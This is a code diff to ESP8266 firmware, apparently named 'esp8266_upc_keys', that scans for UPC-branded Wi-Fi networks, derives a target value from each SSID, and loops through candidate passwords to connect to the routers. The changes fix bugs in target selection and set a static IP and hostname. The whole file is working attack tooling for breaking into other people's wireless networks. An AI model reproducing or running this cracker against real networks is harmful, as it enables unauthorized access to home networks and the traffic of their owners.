@@ -17,7 +17,7 @@ typedef struct {
 
 // counter for APs seen
 size_t aps_found;
-ap_t aps[MAX_APS] = {0};
+ap_t aps[MAX_APS];
 
 enum {
     SCANNING,
@@ -54,7 +54,13 @@ targets_found(void* arg, STATUS status){
     while (bss_link != NULL){
         bool found = false;
         size_t i;
-        for(i = 0; i < MAX_APS; i++){
+        for(i = 0; i < aps_found; i++){
+            if(aps[i].target && !aps[i].password[0]){
+                state = CRACKING;
+                system_os_post(PRIO_CRACK, 0, (os_param_t) i);
+                // break here to avoid starting another cracking task
+                return;
+            }
             if(strncmp(aps[i].essid, bss_link->ssid, 32) == 0){
                 found = true;
                 os_printf("Saw known AP: %02x:%02x:%02x:%02x:%02x:%02x %s", bss_link->bssid[0], bss_link->bssid[1], bss_link->bssid[2], bss_link->bssid[3], bss_link->bssid[4], bss_link->bssid[5], bss_link->ssid);
@@ -65,22 +71,19 @@ targets_found(void* arg, STATUS status){
             }
         }
         if(!found && aps_found < MAX_APS){
-            aps_found++;
             os_printf("Found new AP: %02x:%02x:%02x:%02x:%02x:%02x %s\n", bss_link->bssid[0], bss_link->bssid[1], bss_link->bssid[2], bss_link->bssid[3], bss_link->bssid[4], bss_link->bssid[5], bss_link->ssid);
-            memcpy(aps[aps_found-1].bssid, bss_link->bssid, 6);
-            memcpy(aps[aps_found-1].essid, bss_link->ssid, 32);
-            if(strncmp(bss_link->ssid, "UPC", 3) == 0 && strlen(bss_link->ssid) == 10){
-                aps[aps_found-1].target = 0;
+            memcpy(aps[aps_found].bssid, bss_link->bssid, 6);
+            memcpy(aps[aps_found].essid, bss_link->ssid, 32);
+            aps[aps_found].target = 0;
+            if(strncmp(aps[aps_found].essid, "UPC", 3) == 0 && strlen(aps[aps_found].essid) == 10){
                 for(i = 3; i < 10; i++){
-                    aps[aps_found-1].target *= 10;
-                    aps[aps_found-1].target += bss_link->ssid[i]-0x30;
+                    aps[aps_found].target *= 10;
+                    aps[aps_found].target += aps[aps_found].essid[i]-0x30;
                 }
-                state = CRACKING;
-                system_os_post(PRIO_CRACK, 0, (os_param_t) aps_found -1);
-                // break here to avoid starting another cracking task
-                return;
             }
+            aps_found++;
         }
+
         bss_link = bss_link->next.stqe_next;
     }
     state = SCANNING;
@@ -99,8 +102,8 @@ static void test_passwords(os_event_t *events){
         return;
     }
 
-    if(ap_timeouts == MAX_TIMEOUTS){
-        os_printf("AP not seen for %u seconds, aborting\n", MAX_TIMEOUTS/10);
+    if(ap_timeouts == MAX_TIMEOUTS_SECONDS*10){
+        os_printf("AP not seen for %u seconds, aborting\n", MAX_TIMEOUTS_SECONDS);
         state = DISCONNECTING;
     }
 
@@ -113,7 +116,6 @@ static void test_passwords(os_event_t *events){
 
     if(state == DISCONNECTING){
         wifi_station_disconnect();
-        wifi_station_set_auto_connect(false);
         state = SCANNING;
         ap_timeouts = 0;
         system_os_post(PRIO_SCAN, 0, 0 );
@@ -130,16 +132,14 @@ static void test_passwords(os_event_t *events){
             // fall through
         case STATION_IDLE: {
             wifi_station_disconnect();
-            wifi_station_set_auto_connect(false);
             ap_timeouts = 0;
             struct station_config config = {0};
-            strcpy(config.ssid, aps[ap_to_crack].essid);
-            strncpy(config.password, candidate_passwords[current_password], 8);
+            memcpy(config.ssid, aps[ap_to_crack].essid, 10);
+            memcpy(config.password, candidate_passwords[current_password], 8);
             memcpy(config.bssid, aps[ap_to_crack].bssid, 6);
             config.bssid_set = 0;
             os_printf("Connecting to %s with password %s\n", config.ssid, config.password);
             wifi_station_set_config(&config);
-            wifi_station_set_auto_connect(true);
             wifi_station_connect();
             break;
           }
@@ -181,6 +181,14 @@ void user_init()
 
     wifi_set_opmode( 0x1 );
     wifi_station_set_auto_connect(false);
+    wifi_station_dhcpc_stop();
+    wifi_station_set_hostname("esp8266_upc_keys");
+
+    struct ip_info info;
+    info.ip.addr = ipaddr_addr("192.168.13.37");
+    info.netmask.addr = ipaddr_addr("255.255.255.0");
+    info.gw.addr = ipaddr_addr("192.168.1.1");
+    wifi_set_ip_info(STATION_IF, &info);
 
     system_update_cpu_freq(SYS_CPU_160MHZ);
 
@@ -190,6 +198,7 @@ void user_init()
     system_os_task(test_passwords, PRIO_TEST, user_procTaskQueue, user_procTaskQueueLen);
 
     // start scanning
+    memset(aps, 0x0, sizeof(aps));
     aps_found = 0;
     state = SCANNING;
     system_os_post(PRIO_SCAN, 0, 0 );
